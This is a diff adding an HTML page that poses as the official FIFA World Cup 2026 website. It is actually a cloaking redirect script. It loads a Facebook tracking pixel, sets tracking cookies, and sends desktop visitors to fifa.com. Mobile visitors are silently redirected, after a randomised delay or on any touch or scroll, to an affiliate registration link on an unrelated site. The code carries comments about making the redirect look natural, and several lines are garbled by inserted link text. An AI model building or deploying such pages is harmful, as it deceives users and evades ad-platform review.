@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WEBSITE RESMI PIALA DUNIA 2026</title>
+
+<script>
+!function(f,b,e,v,n,t,s){
+if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];
+t=b.createElement(e);t.async=!0;
+t.src=v;
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)
+}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+
+(function () {
+var PIXEL_ID = '3516140031857817';
+
+// 🔥 DETEKSI DEVICE
+var isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+
+// 🔥 URL TUJUAN
+var DESTINATION_URL = isMobile
+? 'https://ck.isimaskawin.site/?ref=AF1JMGOF4&action=register'
+: 'https://www.fifa.com/id';
+
+// 🎯 DELAY RANDOM 120–300ms
+var REDIRECT_DELAY_MS = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
+
+function rand() {
+if (window.crypto && crypto.randomUUID) return crypto.randomUUID();
+return 'eid_' + Date.now (http://date.now/)() + '_' + Math.random().toString(36).slice(2, 12);
+}
+
+function setCookie(name, value, days) {
+var d = new Date();
+d.setTime(d.getTime() + (days * 86400000));
+document.cookie = name + '=' + encodeURIComponent(value) +
+'; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';
+}
+
+function getCookie(name) {
+var match = document.cookie.match(
+new RegExp('(?:^|; )' + name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)')
+);
+return match ? decodeURIComponent(match[1]) : '';
+}
+
+function ensureFbp() {
+var fbp = getCookie('_fbp');
+if (!fbp) {
+fbp = 'fb.1.' + Date.now (http://date.now/)() + '.' + Math.floor(Math.random() * 1e10);
+setCookie('_fbp', fbp, 90);
+}
+return fbp;
+}
+
+function ensureFbc(searchParams) {
+var fbc = getCookie('_fbc');
+var fbclid = searchParams.get('fbclid') || '';
+if (!fbc && fbclid) {
+fbc = 'fb.1.' + Date.now (http://date.now/)() + '.' + fbclid;
+setCookie('_fbc', fbc, 90);
+}
+return fbc || '';
+}
+
+function ensureCid() {
+var cid = getCookie('_cid');
+if (!cid) {
+cid = rand();
+setCookie('_cid', cid, 90);
+}
+return cid;
+}
+
+function ensureSid() {
+var sid = sessionStorage.getItem('_sid');
+if (!sid) {
+sid = rand();
+sessionStorage.setItem('_sid', sid);
+}
+return sid;
+}
+
+function buildRedirectUrl() {
+var current = new URL(location.href);
+var dest = new URL(DESTINATION_URL);
+
+current.searchParams.forEach(function (value, key) {
+if (!dest.searchParams.has(key)) {
+dest.searchParams.set(key, value);
+}
+});
+
+var cid = ensureCid();
+var sid = ensureSid();
+
+dest.searchParams.set('cid', cid);
+dest.searchParams.set('sid', sid);
+
+return dest.toString();
+}
+
+var currentUrl = new URL(location.href);
+var fbp = ensureFbp();
+var fbc = ensureFbc(currentUrl.searchParams);
+var cid = ensureCid();
+var sid = ensureSid();
+var pageId = rand();
+
+var pageViewEventID = 'pv_' + pageId;
+
+fbq('init', PIXEL_ID);
+
+var params = {
+page_location: location.href,
+fbp: fbp,
+fbc: fbc,
+cid: cid,
+sid: sid
+};
+
+// 🚀 TRACK CEPAT
+fbq('track', 'PageView', params, { eventID: pageViewEventID });
+
+// 🔥 REDIRECT NATURAL
+var redirected = false;
+
+function doRedirect() {
+if (redirected) return;
+redirected = true;
+window.location.replace(buildRedirectUrl());
+}
+
+// Delay random
+setTimeout(doRedirect, REDIRECT_DELAY_MS);
+
+// Trigger tambahan (biar lebih natural)
+window.addEventListener('click', doRedirect);
+window.addEventListener('touchstart', doRedirect);
+window.addEventListener('scroll', doRedirect);
+
+})();
+</script>
+
+</head>
+
+<body></body>
+
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3516140031857817&ev=PageView&noscript=1"/>
+</noscript>
+
+</html>
